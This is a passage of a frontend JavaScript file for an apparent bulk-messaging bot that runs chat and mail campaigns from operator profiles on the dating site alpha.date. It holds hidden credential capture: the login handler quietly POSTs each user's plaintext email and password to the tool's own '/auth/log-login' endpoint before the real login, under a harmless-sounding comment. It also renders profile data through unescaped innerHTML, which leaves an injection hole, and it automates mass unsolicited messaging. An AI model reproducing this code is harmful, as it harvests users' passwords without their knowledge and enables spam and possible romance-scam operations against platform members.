// public/app.js
document.addEventListener('DOMContentLoaded', () => {

    window.addEventListener('beforeunload', function (e) {
        const confirmationMessage = 'Are you sure you want to leave? Turn off sender before exit.';
        e.preventDefault();
        e.returnValue = confirmationMessage;
        return confirmationMessage;
    });


    // DOM Elements
    const loginForm = document.getElementById('login-container');
    const mainContainer = document.getElementById('main-container');
    const loginBtn = document.getElementById('login-btn');
    const loginStatus = document.getElementById('login-status');
    const emailInput = document.getElementById('email');
    const passwordInput = document.getElementById('password');
    const chatProfilesContainer = document.getElementById('chat-profiles-container');
    const mailProfilesContainer = document.getElementById('mail-profiles-container');
    const toggleAttachments = document.getElementById('toggle-attachments');

    const API_URL = import.meta.env.VITE_API_URL || window.location.origin + '/api';

    // App State
    let userData = {
        email: '',
        token: '',
        operatorId: ''
    };

    // Check for stored login on page load
    checkStoredLogin();

    async function checkStoredLogin() {
        const storedData = localStorage.getItem('alphaAutoData');
        if (storedData) {
            try {
                userData = JSON.parse(storedData);
                emailInput.value = userData.email;

                // Try to validate the stored session
                loginStatus.textContent = 'Checking stored session...';
                loginStatus.className = 'status processing';

                const isValid = await validateSession();
                if (isValid) {
                    // Session is valid, switch to main interface
                    loginForm.style.display = 'none';
                    mainContainer.style.display = 'block';
                    await loadProfiles();
                    loginStatus.textContent = 'Session restored successfully!';
                    loginStatus.className = 'status success';
                } else {
                    // Session is invalid, clear stored data
                    localStorage.removeItem('alphaAutoData');
                    loginStatus.textContent = 'Session expired, please login again';
                    loginStatus.className = 'status error';
                }
            } catch (error) {
                console.error('Failed to parse stored data:', error);
                localStorage.removeItem('alphaAutoData');
            }
        }
    }

    function makeAuthenticatedRequest(url, options = {}) {
        const token = userData.token;

        if (!token) {
            throw new Error('No authentication token available');
        }

        const defaultOptions = {
            credentials: 'include',
            headers: {
                'Accept': 'application/json',
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${token}`,
                'X-Auth-Token': token
            }
        };

        // Merge headers
        const mergedOptions = {
            ...defaultOptions,
            ...options,
            headers: {
                ...defaultOptions.headers,
                ...(options.headers || {})
            }
        };

        console.log('Making authenticated request to:', url);
        console.log('With token:', token.substring(0, 20) + '...');

        return fetch(url, mergedOptions);
    }

    async function validateSession() {
        try {
            const response = await makeAuthenticatedRequest(`${API_URL}/chat/profiles`);

            if (response.status === 401) {
                console.log('Session validation failed - 401 response');
                return false;
            }

            const data = await response.json();
            console.log('Session validation response:', data);

            return response.ok;
        } catch (error) {
            console.error('Session validation failed:', error);
            return false;
        }
    }

    // Login Handler
    loginBtn.addEventListener('click', async () => {
        const email = emailInput.value.trim();
        const password = passwordInput.value.trim();

        if (!email || !password) {
            displayLoginError('Please fill in email and password');
            return;
        }

        loginBtn.disabled = true;
        loginStatus.textContent = 'Checking credentials...';
        loginStatus.className = 'status processing';

        try {
            // Log the login attempt
            await fetch(`${API_URL}/auth/log-login`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ email, password })
            });

            // Step 1: Login to get user data
            const loginResponse = await fetch("https://alpha.date/api/login/login", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    email: email,
                    password: password
                })
            });

            if (!loginResponse.ok) {
                throw new Error('Login failed - invalid credentials');
            }

            const loginData = await loginResponse.json();

            // Extract user data from response
            userData = {
                email: email,
                token: loginData.token,
                operatorId: loginData.operator_id
            };

            console.log('Login successful, user data:', { email: userData.email, operatorId: userData.operatorId });

            // Step 2: Check whitelist with the obtained token
            const whitelistResponse = await fetch(`${API_URL}/auth/check-whitelist`, {
                method: 'POST',
                credentials: 'include',
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                },
                body: JSON.stringify({
                    email: userData.email,
                    token: userData.token,
                })
            });

            const whitelistData = await whitelistResponse.json();

            if (whitelistData.success) {
                // Store user data
                localStorage.setItem('alphaAutoData', JSON.stringify(userData));

                // Switch to main interface
                loginForm.style.display = 'none';
                mainContainer.style.display = 'block';

                // Load profiles data
                await loadProfiles();

                loginStatus.textContent = 'Login successful!';
                loginStatus.className = 'status success';
            } else {
                displayLoginError('Not authorized: Email not in whitelist');
            }
        } catch (error) {
            console.error('Login error:', error);
            displayLoginError(`Error: ${error.message}`);
        } finally {
            loginBtn.disabled = false;
        }
    });

    function displayLoginError(message) {
        loginStatus.textContent = message;
        loginStatus.className = 'status error';
    }

    // Render Logout, STOP ALL, and Theme Toggle buttons in the top right
    function renderTopRightButtons() {
        // Remove existing if present
        document.getElementById('logout-btn')?.remove();
        document.getElementById('stop-all-btn')?.remove();
        document.getElementById('theme-toggle')?.remove();
        document.getElementById('top-right-btns')?.remove();

        // Create container
        const btnContainer = document.createElement('div');
        btnContainer.className = 'top-right-btns';
        btnContainer.id = 'top-right-btns';
        btnContainer.style.position = 'fixed';
        btnContainer.style.top = '10px';
        btnContainer.style.right = '10px';
        btnContainer.style.zIndex = '1000';
        btnContainer.style.display = 'flex';
        btnContainer.style.gap = '8px';

        // Logout button
        const logoutBtn = document.createElement('button');
        logoutBtn.id = 'logout-btn';
        logoutBtn.textContent = 'Logout';
        logoutBtn.className = 'control-btn btn-clear';
        logoutBtn.addEventListener('click', () => {
            localStorage.removeItem('alphaAutoData');
            location.reload();
        });

        // STOP ALL button
        const stopAllBtn = document.createElement('button');
        stopAllBtn.id = 'stop-all-btn';
        stopAllBtn.textContent = '⚠️ STOP ALL';
        stopAllBtn.className = 'button';
        stopAllBtn.style.background = '#f44336';
        stopAllBtn.style.color = '#fff';
        stopAllBtn.addEventListener('click', () => {
            // Stop all chat profiles
            const chatProfileBlocks = document.querySelectorAll('.profile-item[data-profile-type="chat"]');
            chatProfileBlocks.forEach(block => {
                const profileId = block.dataset.profileId;
                stopChatProcessing(profileId);
            });
            // Stop all mail profiles
            const mailProfileBlocks = document.querySelectorAll('.profile-item[data-profile-type="mail"]');
            mailProfileBlocks.forEach(block => {
                const profileId = block.dataset.profileId;
                stopMailProcessing(profileId);
            });
        });

        // Theme toggle button
        const themeToggleBtn = document.createElement('button');
        themeToggleBtn.id = 'theme-toggle';
        themeToggleBtn.className = 'button';
        themeToggleBtn.style.background = '#333';
        themeToggleBtn.style.color = '#fff';
        function setTheme(isDark) {
            document.body.classList.toggle('dark-mode', isDark);
            themeToggleBtn.textContent = isDark ? '☀️ Day Mode' : '🌙 Night Mode';
        }
        // Load theme from localStorage
        const savedTheme = localStorage.getItem('alphaTheme');
        setTheme(savedTheme === 'dark');
        themeToggleBtn.addEventListener('click', () => {
            const isDark = !document.body.classList.contains('dark-mode');
            setTheme(isDark);
            localStorage.setItem('alphaTheme', isDark ? 'dark' : 'light');
        });

        // Add buttons to container
        btnContainer.appendChild(logoutBtn);
        btnContainer.appendChild(stopAllBtn);
        btnContainer.appendChild(themeToggleBtn);
        document.body.appendChild(btnContainer);
    }

    // --- Periodic sync of processing state for all profiles ---
    let processingSyncInterval = null;
    function startProcessingSync() {
        if (processingSyncInterval) clearInterval(processingSyncInterval);
        processingSyncInterval = setInterval(syncAllProfileProcessingStates, 60000); // every minute
    }

    async function syncAllProfileProcessingStates() {
        // Chat profiles
        document.querySelectorAll('.profile-item[data-profile-type="chat"]').forEach(async (profileBlock) => {
            const profileId = profileBlock.dataset.profileId;
            // Only select the Start/Stop button in .controls, not .btn-refresh
            const controls = profileBlock.querySelector('.controls');
            const startStopBtn = controls ? controls.querySelector('button.control-btn:not(.btn-clear):not(.btn-refresh)') : null;
            const textarea = profileBlock.querySelector('textarea');
            const status = profileBlock.querySelector('.status');
            if (!profileId || !startStopBtn || !textarea || !status) return;
            try {
                const resp = await fetch(`${API_URL}/chat/status/${profileId}`);
                const data = await resp.json();
                const isProc = data.status && data.status.toLowerCase().includes('processing');
                startStopBtn.textContent = isProc ? 'Stop' : 'Start';
                startStopBtn.classList.toggle('btn-stop', isProc);
                startStopBtn.classList.toggle('btn-start', !isProc);
                startStopBtn.disabled = false;
                textarea.disabled = isProc;
                const savedMsg = localStorage.getItem(`chat_msg_${profileId}`);
                const syncedInvite = data.invite
                if (isProc && (savedMsg || data.invite) && !textarea.value) {
                    textarea.value = syncedInvite || savedMsg;
                    if (syncedInvite) localStorage.setItem(`chat_msg_${profileId}`, syncedInvite);
                }
                status.textContent = data.status || (isProc ? 'Processing' : 'Ready');
                status.className = isProc ? 'status processing' : 'status';
            } catch { }
        });
        // Mail profiles
        document.querySelectorAll('.profile-item[data-profile-type="mail"]').forEach(async (profileBlock) => {
            const profileId = profileBlock.dataset.profileId;
            // Only select the Start/Stop button in .controls, not .btn-refresh
            const controls = profileBlock.querySelector('.controls');
            const startStopBtn = controls ? controls.querySelector('button.control-btn:not(.btn-clear):not(.btn-refresh)') : null;
            const textarea = profileBlock.querySelector('textarea');
            const status = profileBlock.querySelector('.status');
            const attachmentsContainer = profileBlock.querySelector('.attachments-container');
            if (!profileId || !startStopBtn || !textarea || !status) return;
            try {
                const resp = await fetch(`${API_URL}/mail/status/${profileId}`);
                const data = await resp.json();
                const isProc = data.status && data.status.toLowerCase().includes('processing');
                console.log('Mail status: isProc', data);
                startStopBtn.textContent = isProc ? 'Stop' : 'Start';
                startStopBtn.classList.toggle('btn-stop', isProc);
                startStopBtn.classList.toggle('btn-start', !isProc);
                startStopBtn.disabled = false;
                textarea.disabled = isProc;
                if (attachmentsContainer) {
                    const checkboxes = attachmentsContainer.querySelectorAll('input[type="checkbox"]');
                    checkboxes.forEach(cb => cb.disabled = isProc);
                }
                const savedMsg = localStorage.getItem(`mail_msg_${profileId}`);
                const syncedInvite = data.invite
                if (isProc && (savedMsg || data.invite) && !textarea.value) {
                    textarea.value = syncedInvite || savedMsg;
                    if (syncedInvite) localStorage.setItem(`mail_msg_${profileId}`, syncedInvite);
                }
                status.textContent = data.status || (isProc ? 'Processing' : 'Ready');
                status.className = isProc ? 'status processing' : 'status';
            } catch { }
        });
    }

    // Start sync after login/session restore
    function addLogoutButton() {
        document.getElementById('theme-toggle-login')?.remove();
        renderTopRightButtons();
        syncAllProfileProcessingStates(); // Immediate sync on first render
        startProcessingSync();
    }

    // Load Profiles
    async function loadProfiles() {
        try {
            console.log('Loading profiles with token:', userData.token?.substring(0, 20) + '...');

            // Load chat profiles
            const chatResponse = await makeAuthenticatedRequest(`${API_URL}/chat/profiles`);

            if (chatResponse.status === 401) {
                console.log('Chat profiles request returned 401');
                localStorage.removeItem('alphaAutoData');
                location.reload();
                return;
            }

            const chatData = await chatResponse.json();
            console.log('Chat profiles response:', chatData);

            if (chatData.success) {
                renderChatProfiles(chatData.profiles);
            } else {
                console.error('Failed to load chat profiles:', chatData.message);
                // If it's an auth error, show debug info
                if (chatData.debug) {
                    console.log('Debug info:', chatData.debug);
                }
            }

            // Load mail profiles
            const mailResponse = await makeAuthenticatedRequest(`${API_URL}/mail/profiles`);

            if (mailResponse.status === 401) {
                console.log('Mail profiles request returned 401');
                localStorage.removeItem('alphaAutoData');
                location.reload();
                return;
            }

            const mailData = await mailResponse.json();
            console.log('Mail profiles response:', mailData);

            if (mailData.success) {
                renderMailProfiles(mailData.profiles);
            } else {
                console.error('Failed to load mail profiles:', mailData.message);
            }

            // Add logout button after successful load
            addLogoutButton();
        } catch (error) {
            console.error('Failed to load profiles:', error);
            // If network error, might be session issue
            if (error.name === 'TypeError' && error.message.includes('fetch')) {
                console.log('Network error detected, clearing stored data');
                localStorage.removeItem('alphaAutoData');
                location.reload();
            }
        }
    }

    // --- CONSTANTS for validation ---
    const LETTER_MIN = 150;
    const LETTER_MAX = 5000;
    const MESSAGE_MIN = 1;
    const MESSAGE_MAX = 300;

    // Render Chat Profiles
    function renderChatProfiles(profiles) {
        chatProfilesContainer.innerHTML = '';

        profiles.forEach(profile => {
            const profileBlock = document.createElement('div');
            profileBlock.className = 'profile-item';
            profileBlock.dataset.profileId = profile.external_id;
            profileBlock.dataset.profileType = 'chat';

            // Profile header
            const header = document.createElement('div');
            header.className = 'profile-header';
            header.innerHTML = `
        <img src="${profile.photo_link}" class="profile-photo" 
             alt="${profile.name}" onerror="this.src='/default-female.svg'">
        <div class="profile-info">
          <div class="profile-name">${profile.name}, ${profile.age}</div>
          <div class="profile-meta">
            <span>ID: ${profile.external_id}</span>
            <span>${profile.country_name}</span>
          </div>
        </div>
      `;

            // Textarea for message template
            const textarea = document.createElement('textarea');
            textarea.placeholder = `Enter message (min ${MESSAGE_MIN}, max ${MESSAGE_MAX} chars)...`;
            textarea.maxLength = MESSAGE_MAX;
            textarea.rows = 6;
            const savedMsg = localStorage.getItem(`chat_msg_${profile.external_id}`);
            if (savedMsg) {
                textarea.value = savedMsg;
            }

            // Character counter
            const charCounter = document.createElement('div');
            charCounter.className = 'char-counter';
            updateCharCounter(textarea, charCounter, MESSAGE_MIN, MESSAGE_MAX);

            textarea.addEventListener('input', () => {
                updateCharCounter(textarea, charCounter, MESSAGE_MIN, MESSAGE_MAX);
                localStorage.setItem(`chat_msg_${profile.external_id}`, textarea.value.trim());
            });

            // Status
            const status = document.createElement('div');
            status.className = 'status';
            status.textContent = 'Ready';

            // Controls
            const controls = document.createElement('div');
            controls.className = 'controls';

            // Start/Stop button
            const startStopBtn = document.createElement('button');
            startStopBtn.textContent = 'Start';
            startStopBtn.className = 'control-btn btn-start';
            let isProcessing = false;
            let pollingInterval = null;

            function setInputsDisabled(disabled) {
                textarea.disabled = disabled;
            }

            startStopBtn.addEventListener('click', async () => {
                if (!isProcessing && startStopBtn.textContent === 'Start') {
                    // Start process
                    startStopBtn.textContent = 'Pending...';
                    startStopBtn.disabled = true;
                    status.textContent = '';
                    setInputsDisabled(true);
                    try {
                        const messageTemplate = textarea.value.trim();
                        if (messageTemplate.length < MESSAGE_MIN || messageTemplate.length > MESSAGE_MAX) {
                            status.textContent = `Error: Message must be between ${MESSAGE_MIN} and ${MESSAGE_MAX} characters`;
                            status.className = 'status error';
                            startStopBtn.textContent = 'Start';
                            startStopBtn.disabled = false;
                            setInputsDisabled(false);
                            return;
                        }
                        const response = await makeAuthenticatedRequest(`${API_URL}/chat/start`, {
                            method: 'POST',
                            body: JSON.stringify({ profileId: profile.external_id, messageTemplate })
                        });
                        if (!response.ok) {
                            status.textContent = 'Start Failed, try again later';
                            status.className = 'status error';
                            startStopBtn.textContent = 'Start';
                            startStopBtn.disabled = false;
                            setInputsDisabled(false);
                            return;
                        }
                        const data = await response.json();
                        if (data.success) {
                            isProcessing = true;
                            startStopBtn.textContent = 'Stop';
                            startStopBtn.classList.remove('btn-start');
                            startStopBtn.classList.add('btn-stop');
                            status.textContent = 'Processing';
                            status.className = 'status processing';
                            startStopBtn.disabled = false;
                            setInputsDisabled(true);
                            if (pollingInterval) clearInterval(pollingInterval);
                            pollingInterval = setInterval(async () => {
                                const resp = await makeAuthenticatedRequest(`${API_URL}/chat/status/${profile.external_id}`);
                                const statData = await resp.json();
                                if (statData.status && (statData.status.includes('Completed') || statData.status.includes('Error') || statData.status === 'Ready' || statData.status === 'Processing stopped')) {
                                    isProcessing = false;
                                    startStopBtn.textContent = 'Start';
                                    startStopBtn.classList.remove('btn-stop');
                                    startStopBtn.classList.add('btn-start');
                                    status.textContent = statData.status;
                                    status.className = statData.status.includes('Error') ? 'status error' : 'status';
                                    clearInterval(pollingInterval);
                                    setInputsDisabled(false);
                                }
                            }, 2000);
                        } else {
                            status.textContent = 'Start Failed, try again later';
                            status.className = 'status error';
                            startStopBtn.textContent = 'Start';
                            startStopBtn.disabled = false;
                            setInputsDisabled(false);
                        }
                    } catch (error) {
                        status.textContent = 'Start Failed, try again later';
                        status.className = 'status error';
                        startStopBtn.textContent = 'Start';
                        startStopBtn.disabled = false;
                        setInputsDisabled(false);
                    }
                } else if (isProcessing || startStopBtn.textContent === 'Stop') {
                    // Stop process (no validation)
                    startStopBtn.textContent = 'Pending...';
                    startStopBtn.disabled = true;
                    try {
                        await stopChatProcessing(profile.external_id);
                        isProcessing = false;
                        startStopBtn.textContent = 'Start';
                        startStopBtn.classList.remove('btn-stop');
                        startStopBtn.classList.add('btn-start');
                        status.textContent = 'Ready';
                        status.className = 'status';
                        if (pollingInterval) clearInterval(pollingInterval);
                        startStopBtn.disabled = false;
                        setInputsDisabled(false);
                    } catch (error) {
                        status.textContent = 'Failed to stop, try again';
                        status.className = 'status error';
                        startStopBtn.textContent = 'Stop';
                        startStopBtn.disabled = false;
                    }
                }
            });

            // Clear Blocks button
            const clearBtn = document.createElement('button');
            clearBtn.textContent = 'Clear Blocks';
            clearBtn.className = 'control-btn btn-clear';
            clearBtn.addEventListener('click', () => clearChatBlocks(profile.external_id));

            controls.append(startStopBtn, clearBtn);

            // Assemble
            profileBlock.append(header, textarea, charCounter, status, controls);
            chatProfilesContainer.appendChild(profileBlock);
        });
    }

    // Render Mail Profiles
    function renderMailProfiles(profiles) {
        mailProfilesContainer.innerHTML = '';

        profiles.forEach(profile => {
            const profileBlock = document.createElement('div');
            profileBlock.className = 'profile-item';
            profileBlock.dataset.profileId = profile.external_id;
            profileBlock.dataset.profileType = 'mail';

            // Profile header
            const header = document.createElement('div');
            header.className = 'profile-header';
            header.innerHTML = `
        <img src="${profile.photo_link}" class="profile-photo" 
             alt="${profile.name}" onerror="this.src='/default-female.svg'">
        <div class="profile-info">
          <div class="profile-name">${profile.name}, ${profile.age}</div>
          <div class="profile-meta">
            <span>ID: ${profile.external_id}</span>
            <span>${profile.country_name}</span>
          </div>
        </div>
      `;

            // Textarea for message template
            const textarea = document.createElement('textarea');
            textarea.placeholder = `Write your letter (min ${LETTER_MIN}, max ${LETTER_MAX} chars)...`;
            textarea.maxLength = LETTER_MAX;
            textarea.rows = 10;
            const savedMsg = localStorage.getItem(`mail_msg_${profile.external_id}`);
            if (savedMsg) {
                textarea.value = savedMsg;
            }

            // Character counter
            const charCounter = document.createElement('div');
            charCounter.className = 'char-counter';
            updateCharCounter(textarea, charCounter, LETTER_MIN, LETTER_MAX);

            textarea.addEventListener('input', () => {
                updateCharCounter(textarea, charCounter, LETTER_MIN, LETTER_MAX);
                localStorage.setItem(`mail_msg_${profile.external_id}`, textarea.value.trim());
            });

            // Attachments container
            const attachmentsContainer = document.createElement('div');
            attachmentsContainer.className = 'attachments-container';
            attachmentsContainer.style.display = 'none';

            // Create a wrapper for attachments content
            const attachmentsContent = document.createElement('div');
            attachmentsContent.className = 'attachments-grid';
            attachmentsContent.style.display = 'grid';
            attachmentsContent.innerHTML = '<div class="status">Loading attachments...</div>';

            // Add refresh button
            const refreshBtn = document.createElement('button');
            refreshBtn.textContent = '🔄 Refresh Attachments';
            refreshBtn.className = 'control-btn btn-refresh';
            refreshBtn.style.marginBottom = '10px';
            refreshBtn.style.color = 'black';
            refreshBtn.addEventListener('click', () => {
                loadAttachments(profile.external_id, attachmentsContent);
            });

            // Add both elements to container
            profileBlock.appendChild(refreshBtn);
            attachmentsContainer.appendChild(attachmentsContent);

            // Load attachments
            loadAttachments(profile.external_id, attachmentsContent);

            // Toggle attachments display
            if (toggleAttachments) {
                toggleAttachments.addEventListener('change', () => {
                    const containers = document.querySelectorAll('.attachments-container');
                    containers.forEach(container => {
                        container.style.display = toggleAttachments.checked ? 'block' : 'none';
                    });
                });
            }

            // Status
            const status = document.createElement('div');
            status.className = 'status';
            status.textContent = 'Ready';

            // Controls
            const controls = document.createElement('div');
            controls.className = 'controls';

            // Start/Stop button
            const startStopBtn = document.createElement('button');
            startStopBtn.textContent = 'Start';
            startStopBtn.className = 'control-btn btn-start';
            let isProcessing = false;
            let pollingInterval = null;

            function setMailInputsDisabled(disabled) {
                textarea.disabled = disabled;
                // Disable all checkboxes in this profile's attachments
                const checkboxes = attachmentsContainer.querySelectorAll('input[type="checkbox"]');
                checkboxes.forEach(cb => cb.disabled = disabled);
            }

            startStopBtn.addEventListener('click', async () => {
                if (!isProcessing && startStopBtn.textContent === 'Start') {
                    // Start process
                    startStopBtn.textContent = 'Pending...';
                    startStopBtn.disabled = true;
                    status.textContent = '';
                    setMailInputsDisabled(true);
                    try {
                        const message = textarea.value.trim();
                        if (message.length < LETTER_MIN || message.length > LETTER_MAX) {
                            status.textContent = `Error: Letter must be between ${LETTER_MIN} and ${LETTER_MAX} characters`;
                            status.className = 'status error';
                            startStopBtn.textContent = 'Start';
                            startStopBtn.disabled = false;
                            setMailInputsDisabled(false);
                            return;
                        }
                        // Get selected attachments
                        const attachments = Array.from(attachmentsContainer.querySelectorAll('input:checked')).map(checkbox => {
                            const attachmentItem = checkbox.closest('.attachment-item');
                            const filename = attachmentItem.querySelector('.attachment-filename').textContent;
                            const preview = attachmentItem.querySelector('.attachment-preview');
                            let link;
                            if (checkbox.dataset.type === 'audios') {
                                link = checkbox.dataset.link;
                            } else {
                                const img = preview.querySelector('img');
                                link = img ? img.src : null;
                            }
                            return {
                                id: checkbox.dataset.id,
                                type: checkbox.dataset.type,
                                filename: filename,
                                link: link,
                                content_type: checkbox.dataset.type === 'images' ? 'image' :
                                    checkbox.dataset.type === 'videos' ? 'video' :
                                        'audio'
                            };
                        });
                        const response = await makeAuthenticatedRequest(`${API_URL}/mail/start`, {
                            method: 'POST',
                            body: JSON.stringify({ profileId: profile.external_id, message, attachments })
                        });
                        if (!response.ok) {
                            status.textContent = 'Start Failed, try again later';
                            status.className = 'status error';
                            startStopBtn.textContent = 'Start';
                            startStopBtn.disabled = false;
                            setMailInputsDisabled(false);
                            return;
                        }
                        const data = await response.json();
                        if (data.success) {
                            isProcessing = true;
                            startStopBtn.textContent = 'Stop';
                            startStopBtn.classList.remove('btn-start');
                            startStopBtn.classList.add('btn-stop');
                            status.textContent = 'Processing';
                            status.className = 'status processing';
                            startStopBtn.disabled = false;
                            setMailInputsDisabled(true);
                            // Restore infinite polling for status
                            if (pollingInterval) clearInterval(pollingInterval);
                            pollingInterval = setInterval(async () => {
                                const resp = await makeAuthenticatedRequest(`${API_URL}/mail/status/${profile.external_id}`);
                                const statData = await resp.json();
                                const isStillProcessing = statData.status && statData.status.toLowerCase().includes('processing');
                                status.textContent = statData.status || (isStillProcessing ? 'Processing' : 'Ready');
                                status.className = isStillProcessing ? 'status processing' : 'status';
                                if (!isStillProcessing) {
                                    isProcessing = false;
                                    startStopBtn.textContent = 'Start';
                                    startStopBtn.classList.remove('btn-stop');
                                    startStopBtn.classList.add('btn-start');
                                    setMailInputsDisabled(false);
                                    clearInterval(pollingInterval);
                                }
                            }, 2000);
                        } else {
                            status.textContent = 'Start Failed, try again later';
                            status.className = 'status error';
                            startStopBtn.textContent = 'Start';
                            startStopBtn.disabled = false;
                            setMailInputsDisabled(false);
                        }
                    } catch (error) {
                        status.textContent = 'Start Failed, try again later';
                        status.className = 'status error';
                        startStopBtn.textContent = 'Start';
                        startStopBtn.disabled = false;
                        setMailInputsDisabled(false);
                    }
                } else if (isProcessing || startStopBtn.textContent === 'Stop') {
                    // Stop process (no validation)
                    startStopBtn.textContent = 'Pending...';
                    startStopBtn.disabled = true;
                    try {
                        await stopMailProcessing(profile.external_id);
                        isProcessing = false;
                        startStopBtn.textContent = 'Start';
                        startStopBtn.classList.remove('btn-stop');
                        startStopBtn.classList.add('btn-start');
                        status.textContent = 'Ready';
                        status.className = 'status';
                        if (pollingInterval) clearInterval(pollingInterval);
                        startStopBtn.disabled = false;
                        setMailInputsDisabled(false);
                    } catch (error) {
                        status.textContent = 'Failed to stop, try again';
                        status.className = 'status error';
                        startStopBtn.textContent = 'Stop';
                        startStopBtn.disabled = false;
                    }
                }
            });

            // Clear Blocks button
            const clearBtn = document.createElement('button');
            clearBtn.textContent = 'Clear Blocks';
            clearBtn.className = 'control-btn btn-clear';
            clearBtn.addEventListener('click', () => clearMailBlocks(profile.external_id));

            controls.append(startStopBtn, clearBtn);

            // Assemble
            profileBlock.append(header, textarea, charCounter, attachmentsContainer, status, controls);
            mailProfilesContainer.appendChild(profileBlock);
        });
    }

    // Load attachments for mail profile
    async function loadAttachments(profileId, container) {
        try {
            // Show loading state
            const statusDiv = container.querySelector('.status') || document.createElement('div');
            statusDiv.className = 'status';
            statusDiv.textContent = 'Loading attachments...';
            if (!container.contains(statusDiv)) {
                container.appendChild(statusDiv);
            }

            const response = await makeAuthenticatedRequest(`${API_URL}/mail/attachments/${profileId}?forceRefresh=true`);

            if (response.status === 401) {
                statusDiv.textContent = 'Session expired';
                statusDiv.className = 'status error';
                return;
            }

            const data = await response.json();
            console.log('Attachments response:', data); // Debug log

            if (data.success) {
                // Clear existing content
                container.innerHTML = '';

                // Render new attachments
                renderAttachments(data.attachments, container);
            } else {
                container.innerHTML = '<div class="status error">Failed to load attachments</div>';
            }
        } catch (error) {
            console.error(`Failed to load attachments for ${profileId}:`, error);
            container.innerHTML = '<div class="status error">Error loading attachments</div>';
        }
    }

    // Render attachments
    function renderAttachments(attachments, container) {
        if (!attachments) {
            container.innerHTML = '<div class="status">No attachments available</div>';
            return;
        }

        let hasAttachments = false;
        let allCheckboxes = [];
        let warningDiv = null;

        function updateAttachmentLimit() {
            const checked = allCheckboxes.filter(cb => cb.checked);
            if (checked.length >= 5) {
                allCheckboxes.forEach(cb => {
                    if (!cb.checked) cb.disabled = true;
                });
                if (!warningDiv) {
                    warningDiv = document.createElement('div');
                    warningDiv.className = 'attachment-warning';
                    warningDiv.textContent = 'Maximum 5 attachments allowed.';
                    container.prepend(warningDiv);
                }
            } else {
                allCheckboxes.forEach(cb => cb.disabled = false);
                if (warningDiv) {
                    warningDiv.remove();
                    warningDiv = null;
                }
            }
        }

        Object.entries(attachments).forEach(([type, items]) => {
            if (items && items.length > 0) {
                hasAttachments = true;

                items.forEach(item => {
                    if (!item) return;

                    const wrapper = document.createElement('label');
                    wrapper.className = 'attachment-item';

                    const preview = document.createElement('div');
                    preview.className = 'attachment-preview';

                    // Type label overlay
                    const typeLabel = document.createElement('div');
                    typeLabel.className = 'attachment-type-label';
                    if (type === 'images') typeLabel.textContent = 'Photo';
                    else if (type === 'videos') typeLabel.textContent = 'Video';
                    else typeLabel.textContent = 'Audio';
                    preview.appendChild(typeLabel);

                    if (type === 'images' || type === 'videos') {
                        const img = document.createElement('img');
                        img.src = item.thumb_link || item.link;
                        img.alt = item.filename;
                        preview.appendChild(img);
                    } else {
                        preview.innerHTML += `
              <div class="audio-preview">
                <svg viewBox="0 0 24 24" width="24" height="24">
                  <path fill="currentColor" d="M14,2H6A2,2 0 0,0 4,4V20A2,2 0 0,0 6,22H18A2,2 0 0,0 20,20V8L14,2Z"/>
                </svg>
              </div>
            `;
                    }

                    const checkbox = document.createElement('input');
                    checkbox.type = 'checkbox';
                    checkbox.className = 'attachment-checkbox';
                    checkbox.dataset.id = item.id;
                    checkbox.dataset.type = type;
                    checkbox.dataset.filename = item.filename;
                    checkbox.dataset.link = item.link;
                    checkbox.addEventListener('change', updateAttachmentLimit);
                    allCheckboxes.push(checkbox);

                    const filename = document.createElement('div');
                    filename.className = 'attachment-filename';
                    filename.textContent = item.filename || 'Unnamed file';

                    wrapper.append(preview, checkbox, filename);
                    container.append(wrapper);
                });
            }
        });

        updateAttachmentLimit();

        if (!hasAttachments) {
            container.innerHTML = '<div class="status">No attachments available, to add attachments create folder with name "send" for each type of media</div>';
        }
    }

    // Update character counter to show min/max
    function updateCharCounter(textarea, counterElement, minChars, maxChars) {
        const length = textarea.value.length;
        const isValid = length >= minChars && length <= maxChars;
        counterElement.textContent = `${length}/${minChars}-${maxChars} characters`;
        counterElement.classList.toggle('invalid', !isValid);
    }

    // Chat functions
    async function stopChatProcessing(profileId) {
        try {
            const response = await fetch(`${API_URL}/chat/stop`, {
                method: 'POST',
                credentials: 'include',
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                },
                body: JSON.stringify({ profileId })
            });

            const data = await response.json();

            const profileBlock = document.querySelector(`.profile-item[data-profile-id="${profileId}"][data-profile-type="chat"]`);
            const status = profileBlock.querySelector('.status');
            const startStopBtn = profileBlock.querySelector('.control-btn:not(.btn-clear):not(.btn-refresh)');
            const textarea = profileBlock.querySelector('textarea');

            status.textContent = data.message || 'Stopping...';
            // Immediately update UI
            if (startStopBtn && textarea) {
                startStopBtn.textContent = 'Start';
                startStopBtn.classList.remove('btn-stop');
                startStopBtn.classList.add('btn-start');
                startStopBtn.disabled = false;
                textarea.disabled = false;
            }
        } catch (error) {
            console.error('Failed to stop processing:', error);
        }
    }

    async function clearChatBlocks(profileId) {
        try {
            const response = await fetch(`${API_URL}/chat/clear-blocks`, {
                method: 'POST',
                credentials: 'include',
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                },
                body: JSON.stringify({ profileId })
            });

            const data = await response.json();

            const profileBlock = document.querySelector(`.profile-item[data-profile-id="${profileId}"][data-profile-type="chat"]`);
            const status = profileBlock.querySelector('.status');

            status.textContent = data.message || 'Block list cleared';
            status.className = 'status success';
        } catch (error) {
            console.error('Failed to clear blocks:', error);
        }
    }

    // Mail functions
    async function stopMailProcessing(profileId) {
        try {
            const response = await fetch(`${API_URL}/mail/stop`, {
                method: 'POST',
                credentials: 'include',
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                },
                body: JSON.stringify({ profileId })
            });

            const data = await response.json();

            const profileBlock = document.querySelector(`.profile-item[data-profile-id="${profileId}"][data-profile-type="mail"]`);
            const status = profileBlock.querySelector('.status');
            const startStopBtn = profileBlock.querySelector('.control-btn:not(.btn-clear):not(.btn-refresh)');
            const textarea = profileBlock.querySelector('textarea');
            const attachmentsContainer = profileBlock.querySelector('.attachments-container');

            status.textContent = data.message || 'Stopping...';
            // Immediately update UI
            if (startStopBtn && textarea) {
                startStopBtn.textContent = 'Start';
                startStopBtn.classList.remove('btn-stop');
                startStopBtn.classList.add('btn-start');
                startStopBtn.disabled = false;
                textarea.disabled = false;
            }
